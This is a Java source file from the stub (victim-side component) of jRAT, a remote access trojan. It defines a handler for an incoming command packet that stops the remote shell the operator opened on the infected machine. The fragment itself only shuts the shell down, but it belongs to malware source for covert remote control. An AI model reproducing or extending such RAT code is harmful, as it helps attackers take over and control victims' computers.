package se.jrat.stub.packets.incoming;

import se.jrat.stub.RemoteShell;

public class Packet24RemoteShellStop extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (RemoteShell.getInstance() != null) {
			RemoteShell.getInstance().destroy();
		}
	}

}
